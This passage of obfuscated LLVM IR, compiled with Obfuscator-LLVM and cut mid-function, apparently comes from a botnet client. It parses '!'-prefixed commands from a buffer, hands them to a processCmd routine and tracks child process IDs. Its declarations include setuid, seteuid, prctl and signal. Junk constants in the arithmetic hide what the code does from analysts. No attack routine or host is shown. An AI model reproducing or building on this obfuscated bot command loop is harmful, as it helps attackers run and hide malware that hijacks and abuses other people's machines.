  %102 = icmp ult i64 %100, %101
  br i1 %102, label %103, label %193

; <label>:103:                                    ; preds = %98
  %104 = load i32*, i32** @pids, align 8
  %105 = load i32, i32* %12, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = call i32 @waitpid(i32 %108, i32* null, i32 1)
  %110 = icmp sgt i32 %109, 0
  br i1 %110, label %111, label %187

; <label>:111:                                    ; preds = %103
  %112 = load i32, i32* %12, align 4
  %113 = sub i32 0, 1
  %114 = sub i32 %112, %113
  %115 = add nsw i32 %112, 1
  store i32 %114, i32* %14, align 4
  br label %116

; <label>:116:                                    ; preds = %135, %111
  %117 = load i32, i32* %14, align 4
  %118 = zext i32 %117 to i64
  %119 = load i64, i64* @numpids, align 8
  %120 = icmp ult i64 %118, %119
  br i1 %120, label %121, label %140

; <label>:121:                                    ; preds = %116
  %122 = load i32*, i32** @pids, align 8
  %123 = load i32, i32* %14, align 4
  %124 = zext i32 %123 to i64
  %125 = getelementptr inbounds i32, i32* %122, i64 %124
  %126 = load i32, i32* %125, align 4
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = sub i32 %128, 379119103
  %130 = sub i32 %129, 1
  %131 = add i32 %130, 379119103
  %132 = sub i32 %128, 1
  %133 = zext i32 %131 to i64
  %134 = getelementptr inbounds i32, i32* %127, i64 %133
  store i32 %126, i32* %134, align 4
  br label %135

; <label>:135:                                    ; preds = %121
  %136 = load i32, i32* %14, align 4
  %137 = sub i32 0, 1
  %138 = sub i32 %136, %137
  %139 = add i32 %136, 1
  store i32 %138, i32* %14, align 4
  br label %116

; <label>:140:                                    ; preds = %116
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %14, align 4
  %143 = add i32 %142, 281026107
  %144 = sub i32 %143, 1
  %145 = sub i32 %144, 281026107
  %146 = sub i32 %142, 1
  %147 = zext i32 %145 to i64
  %148 = getelementptr inbounds i32, i32* %141, i64 %147
  store i32 0, i32* %148, align 4
  %149 = load i64, i64* @numpids, align 8
  %150 = add i64 %149, -3263264571391594519
  %151 = add i64 %150, -1
  %152 = sub i64 %151, -3263264571391594519
  %153 = add i64 %149, -1
  store i64 %152, i64* @numpids, align 8
  %154 = load i64, i64* @numpids, align 8
  %155 = sub i64 %154, -3399072348908859162
  %156 = add i64 %155, 1
  %157 = add i64 %156, -3399072348908859162
  %158 = add i64 %154, 1
  %159 = mul i64 %157, 4
  %160 = call noalias i8* @malloc(i64 %159) #5
  %161 = bitcast i8* %160 to i32*
  store i32* %161, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %162

; <label>:162:                                    ; preds = %177, %140
  %163 = load i32, i32* %14, align 4
  %164 = zext i32 %163 to i64
  %165 = load i64, i64* @numpids, align 8
  %166 = icmp ult i64 %164, %165
  br i1 %166, label %167, label %183

; <label>:167:                                    ; preds = %162
  %168 = load i32*, i32** @pids, align 8
  %169 = load i32, i32* %14, align 4
  %170 = zext i32 %169 to i64
  %171 = getelementptr inbounds i32, i32* %168, i64 %170
  %172 = load i32, i32* %171, align 4
  %173 = load i32*, i32** %13, align 8
  %174 = load i32, i32* %14, align 4
  %175 = zext i32 %174 to i64
  %176 = getelementptr inbounds i32, i32* %173, i64 %175
  store i32 %172, i32* %176, align 4
  br label %177

; <label>:177:                                    ; preds = %167
  %178 = load i32, i32* %14, align 4
  %179 = add i32 %178, -120077229
  %180 = add i32 %179, 1
  %181 = sub i32 %180, -120077229
  %182 = add i32 %178, 1
  store i32 %181, i32* %14, align 4
  br label %162

; <label>:183:                                    ; preds = %162
  %184 = load i32*, i32** @pids, align 8
  %185 = bitcast i32* %184 to i8*
  call void @free(i8* %185) #5
  %186 = load i32*, i32** %13, align 8
  store i32* %186, i32** @pids, align 8
  br label %187

; <label>:187:                                    ; preds = %183, %103
  br label %188

; <label>:188:                                    ; preds = %187
  %189 = load i32, i32* %12, align 4
  %190 = sub i32 0, 1
  %191 = sub i32 %189, %190
  %192 = add nsw i32 %189, 1
  store i32 %191, i32* %12, align 4
  br label %98

; <label>:193:                                    ; preds = %98
  %194 = load i32, i32* %11, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %195
  store i8 0, i8* %196, align 1
  %197 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim2(i8* %197)
  %198 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %199 = call i8* @strstr(i8* %198, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0)) #9
  %200 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %201 = icmp eq i8* %199, %200
  br i1 %201, label %202, label %203

; <label>:202:                                    ; preds = %193
  br label %92

; <label>:203:                                    ; preds = %193
  %204 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %205 = call i8* @strstr(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.325, i32 0, i32 0)) #9
  %206 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %207 = icmp eq i8* %205, %206
  br i1 %207, label %208, label %209

; <label>:208:                                    ; preds = %203
  call void @exit(i32 0) #12
  unreachable

; <label>:209:                                    ; preds = %203
  %210 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %210, i8** %15, align 8
  %211 = load i8*, i8** %15, align 8
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 33
  br i1 %214, label %215, label %387

; <label>:215:                                    ; preds = %209
  %216 = load i8*, i8** %15, align 8
  %217 = getelementptr inbounds i8, i8* %216, i64 1
  store i8* %217, i8** %16, align 8
  br label %218

; <label>:218:                                    ; preds = %230, %215
  %219 = load i8*, i8** %16, align 8
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp ne i32 %221, 32
  br i1 %222, label %223, label %228

; <label>:223:                                    ; preds = %218
  %224 = load i8*, i8** %16, align 8
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp ne i32 %226, 0
  br label %228

; <label>:228:                                    ; preds = %223, %218
  %229 = phi i1 [ false, %218 ], [ %227, %223 ]
  br i1 %229, label %230, label %233

; <label>:230:                                    ; preds = %228
  %231 = load i8*, i8** %16, align 8
  %232 = getelementptr inbounds i8, i8* %231, i32 1
  store i8* %232, i8** %16, align 8
  br label %218

; <label>:233:                                    ; preds = %228
  %234 = load i8*, i8** %16, align 8
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 0
  br i1 %237, label %238, label %239

; <label>:238:                                    ; preds = %233
  br label %92

; <label>:239:                                    ; preds = %233
  %240 = load i8*, i8** %16, align 8
  store i8 0, i8* %240, align 1
  %241 = load i8*, i8** %15, align 8
  %242 = getelementptr inbounds i8, i8* %241, i64 1
  store i8* %242, i8** %16, align 8
  %243 = load i8*, i8** %15, align 8
  %244 = load i8*, i8** %16, align 8
  %245 = call i64 @strlen(i8* %244) #9
  %246 = getelementptr inbounds i8, i8* %243, i64 %245
  %247 = getelementptr inbounds i8, i8* %246, i64 2
  store i8* %247, i8** %15, align 8
  br label %248

; <label>:248:                                    ; preds = %273, %239
  %249 = load i8*, i8** %15, align 8
  %250 = load i8*, i8** %15, align 8
  %251 = call i64 @strlen(i8* %250) #9
  %252 = sub i64 %251, -3958651148279514604
  %253 = sub i64 %252, 1
  %254 = add i64 %253, -3958651148279514604
  %255 = sub i64 %251, 1
  %256 = getelementptr inbounds i8, i8* %249, i64 %254
  %257 = load i8, i8* %256, align 1
  %258 = zext i8 %257 to i32
  %259 = icmp eq i32 %258, 10
  br i1 %259, label %271, label %260

; <label>:260:                                    ; preds = %248
  %261 = load i8*, i8** %15, align 8
  %262 = load i8*, i8** %15, align 8
  %263 = call i64 @strlen(i8* %262) #9
  %264 = sub i64 0, 1
  %265 = add i64 %263, %264
  %266 = sub i64 %263, 1
  %267 = getelementptr inbounds i8, i8* %261, i64 %265
  %268 = load i8, i8* %267, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 13
  br label %271

; <label>:271:                                    ; preds = %260, %248
  %272 = phi i1 [ true, %248 ], [ %270, %260 ]
  br i1 %272, label %273, label %281

; <label>:273:                                    ; preds = %271
  %274 = load i8*, i8** %15, align 8
  %275 = load i8*, i8** %15, align 8
  %276 = call i64 @strlen(i8* %275) #9
  %277 = sub i64 0, 1
  %278 = add i64 %276, %277
  %279 = sub i64 %276, 1
  %280 = getelementptr inbounds i8, i8* %274, i64 %278
  store i8 0, i8* %280, align 1
  br label %248

; <label>:281:                                    ; preds = %271
  %282 = load i8*, i8** %15, align 8
  store i8* %282, i8** %17, align 8
  br label %283

; <label>:283:                                    ; preds = %295, %281
  %284 = load i8*, i8** %15, align 8
  %285 = load i8, i8* %284, align 1
  %286 = zext i8 %285 to i32
  %287 = icmp ne i32 %286, 32
  br i1 %287, label %288, label %293

; <label>:288:                                    ; preds = %283
  %289 = load i8*, i8** %15, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  %292 = icmp ne i32 %291, 0
  br label %293

; <label>:293:                                    ; preds = %288, %283
  %294 = phi i1 [ false, %283 ], [ %292, %288 ]
  br i1 %294, label %295, label %298

; <label>:295:                                    ; preds = %293
  %296 = load i8*, i8** %15, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %15, align 8
  br label %283

; <label>:298:                                    ; preds = %293
  %299 = load i8*, i8** %15, align 8
  store i8 0, i8* %299, align 1
  %300 = load i8*, i8** %15, align 8
  %301 = getelementptr inbounds i8, i8* %300, i32 1
  store i8* %301, i8** %15, align 8
  %302 = load i8*, i8** %17, align 8
  store i8* %302, i8** %18, align 8
  br label %303

; <label>:303:                                    ; preds = %307, %298
  %304 = load i8*, i8** %18, align 8
  %305 = load i8, i8* %304, align 1
  %306 = icmp ne i8 %305, 0
  br i1 %306, label %307, label %316

; <label>:307:                                    ; preds = %303
  %308 = load i8*, i8** %18, align 8
  %309 = load i8, i8* %308, align 1
  %310 = zext i8 %309 to i32
  %311 = call i32 @toupper(i32 %310) #9
  %312 = trunc i32 %311 to i8
  %313 = load i8*, i8** %18, align 8
  store i8 %312, i8* %313, align 1
  %314 = load i8*, i8** %18, align 8
  %315 = getelementptr inbounds i8, i8* %314, i32 1
  store i8* %315, i8** %18, align 8
  br label %303

; <label>:316:                                    ; preds = %303
  store i32 1, i32* %20, align 4
  %317 = load i8*, i8** %15, align 8
  %318 = call i8* @strtok(i8* %317, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.326, i32 0, i32 0)) #5
  store i8* %318, i8** %21, align 8
  %319 = load i8*, i8** %17, align 8
  %320 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %319, i8** %320, align 16
  br label %321

; <label>:321:                                    ; preds = %362, %316
  %322 = load i8*, i8** %21, align 8
  %323 = icmp ne i8* %322, null
  br i1 %323, label %324, label %364

; <label>:324:                                    ; preds = %321
  %325 = load i8*, i8** %21, align 8
  %326 = load i8, i8* %325, align 1
  %327 = zext i8 %326 to i32
  %328 = icmp ne i32 %327, 10
  br i1 %328, label %329, label %362

; <label>:329:                                    ; preds = %324
  %330 = load i8*, i8** %21, align 8
  %331 = call i64 @strlen(i8* %330) #9
  %332 = add i64 %331, -9033548402682533436
  %333 = add i64 %332, 1
  %334 = sub i64 %333, -9033548402682533436
  %335 = add i64 %331, 1
  %336 = call noalias i8* @malloc(i64 %334) #5
  %337 = load i32, i32* %20, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %338
  store i8* %336, i8** %339, align 8
  %340 = load i32, i32* %20, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %341
  %343 = load i8*, i8** %342, align 8
  %344 = load i8*, i8** %21, align 8
  %345 = call i64 @strlen(i8* %344) #9
  %346 = sub i64 %345, -3964828920838531771
  %347 = add i64 %346, 1
  %348 = add i64 %347, -3964828920838531771
  %349 = add i64 %345, 1
  call void @llvm.memset.p0i8.i64(i8* %343, i8 0, i64 %348, i32 1, i1 false)
  %350 = load i32, i32* %20, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %351
  %353 = load i8*, i8** %352, align 8
  %354 = load i8*, i8** %21, align 8
  %355 = call i8* @strcpy(i8* %353, i8* %354) #5
  %356 = load i32, i32* %20, align 4
  %357 = sub i32 0, %356
  %358 = sub i32 0, 1
  %359 = add i32 %357, %358
  %360 = sub i32 0, %359
  %361 = add nsw i32 %356, 1
  store i32 %360, i32* %20, align 4
  br label %362

; <label>:362:                                    ; preds = %329, %324
  %363 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.326, i32 0, i32 0)) #5
  store i8* %363, i8** %21, align 8
  br label %321

; <label>:364:                                    ; preds = %321
  %365 = load i32, i32* %20, align 4
  %366 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %365, i8** %366)
  %367 = load i32, i32* %20, align 4
  %368 = icmp sgt i32 %367, 1
  br i1 %368, label %369, label %386

; <label>:369:                                    ; preds = %364
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %370

; <label>:370:                                    ; preds = %379, %369
  %371 = load i32, i32* %22, align 4
  %372 = load i32, i32* %20, align 4
  %373 = icmp slt i32 %371, %372
  br i1 %373, label %374, label %385

; <label>:374:                                    ; preds = %370
  %375 = load i32, i32* %22, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %376
  %378 = load i8*, i8** %377, align 8
  call void @free(i8* %378) #5
  br label %379

; <label>:379:                                    ; preds = %374
  %380 = load i32, i32* %22, align 4
  %381 = add i32 %380, 942566053
  %382 = add i32 %381, 1
  %383 = sub i32 %382, 942566053
  %384 = add nsw i32 %380, 1
  store i32 %383, i32* %22, align 4
  br label %370

; <label>:385:                                    ; preds = %370
  br label %386

; <label>:386:                                    ; preds = %385, %364
  br label %387

; <label>:387:                                    ; preds = %386, %209
  br label %92

; <label>:388:                                    ; preds = %92
  br label %389

; <label>:389:                                    ; preds = %388, %80
  store i32 0, i32* %3, align 4
  br label %391

; <label>:390:                                    ; preds = %74
  br label %391

; <label>:391:                                    ; preds = %390, %389
  %392 = load i32, i32* %3, align 4
  ret i32 %392
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #1

declare i32 @prctl(...) #2

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare i32 @setuid(i32) #1

; Function Attrs: nounwind
declare i32 @seteuid(i32) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146429923}
!2 = !{i32 -2146428795}
!3 = !{i32 -2146428104}
!4 = !{i32 -2146427355}
!5 = !{i32 -2146426416}
